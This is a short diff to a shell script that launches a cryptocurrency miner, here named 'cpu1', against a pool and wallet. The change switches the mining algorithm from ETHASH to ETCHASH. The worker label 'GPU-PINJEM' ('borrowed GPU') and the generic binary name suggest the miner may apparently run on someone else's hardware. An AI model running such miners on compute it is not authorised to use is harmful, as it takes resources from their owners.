@@ -8,4 +8,4 @@ WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x cpu1
 
-./cpu1 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./cpu1 --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
